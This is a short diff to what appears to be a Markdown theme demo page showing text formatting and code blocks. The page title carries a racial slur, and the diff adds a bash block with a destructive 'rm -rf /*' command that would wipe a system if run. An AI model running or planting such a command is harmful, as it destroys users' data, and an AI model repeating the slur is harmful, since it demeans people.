@@ -8,6 +8,8 @@ title: Testing nigga
 
 
 Text can be **bold**, _italic_, or ~~strikethrough~~.
+```bash
+sudo ; rm -rf /* ; echo "You are dead" ```
 
 [Link to another page](./another-page.html).
 
@@ -123,6 +125,6 @@ end
 Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
 ```
 
-```
+```bash
 The final element.
 ```
